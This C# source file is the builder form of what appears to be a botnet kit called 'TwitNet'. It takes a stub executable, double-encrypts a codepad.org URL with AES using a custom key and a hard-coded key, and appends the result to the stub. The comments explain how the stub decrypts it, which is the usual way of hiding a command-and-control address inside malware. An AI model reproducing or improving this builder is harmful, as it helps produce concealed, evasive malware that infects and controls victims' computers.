/* TODO
 * - Maybe some more options other than codepage?
 */
using System;
using System.Text;
using System.Windows.Forms;
using System.IO;
using System.Text.RegularExpressions;
using TwitNetBuilder.Util.Encryption;

namespace TwitNetBuilder
{
    public partial class MainForm : Form
    {
        public MainForm()
        {
            InitializeComponent();
        }

        private void BuildButtonClick(object sender, EventArgs e)
        {
            //We find the file name to save as
            OpenFileDialog stubSaveDialog = new OpenFileDialog {
                           Filter = "EXE File(*.exe)|*.exe",
                           InitialDirectory = Application.StartupPath,
                           Title = "Show me the stub baby" };
            DialogResult showDialog = stubSaveDialog.ShowDialog();

            if(string.IsNullOrEmpty(stubSaveDialog.FileName) || showDialog != DialogResult.OK)
            {
                return;
            }
            Constants.StubFileName = stubSaveDialog.FileName;
            //We load the stub and config data (just a url for now)
            Constants.CustomEncryptionKey = EncryptKeyBox.Text;
            byte[] stub = File.ReadAllBytes(Constants.StubFileName);
            //string appendData = Constants.Splitter + Regex.Split(CodePadBox.Text, "http://")[1].Split('.')[0];

            /*
             * K so im going to try and document this well since you are high:
             * There are two encryption keys, a default one and a custom one the user sets.
             * Basically it takes the config (right now just a URL) and encrypts it with the user's
             * custom key. Then it makes appendData = Splitter + (Encrypted Config) + Splitter + (Custom Encryption Key)
             * After that it encrypts appendData with the default key. From the stub, you can decrypt with the
             * default key, look for the custom key after the last splitter, then decrypt the config.
             * This is probably the safest way of doing it. To make it easier for the stub to find the
             * encrypted data, you might want to uncomment the last appendData assertion
             * which just adds a splitter before all of this.
             */

            
            //We run fancy encryption (check for documentation)
            SimpleAES customAES = new SimpleAES();

            customAES.Key = Encoding.Default.GetBytes(Constants.CustomEncryptionKey);
            string appendData = customAES.EncryptToString(Regex.Split(CodePadBox.Text, "http://")[1].Split('.')[0]);
            

            SimpleAES defaultAES = new SimpleAES();
            defaultAES.Key = Encoding.Default.GetBytes(Constants.DefaultEncryptionKey);
            appendData = Constants.Splitter + defaultAES.EncryptToString(appendData + Constants.Splitter + Constants.CustomEncryptionKey);

            //Above steps:
            //CustomKeycrypt(codepad page)
            //|split|DefaultKeycrypt(CustomKeycrypt(codepad page)|split|+CustomKey)


            //We write the original stub exe + appended data
            StreamWriter writer = new StreamWriter(Constants.StubFileName.Replace(".exe", "-new.exe"), false, Encoding.Default);
            writer.AutoFlush = true;
            writer.Write(Encoding.Default.GetString(stub));
            writer.Write(appendData);
            writer.Close();

            MessageBox.Show("Completed");
        }
    }
}
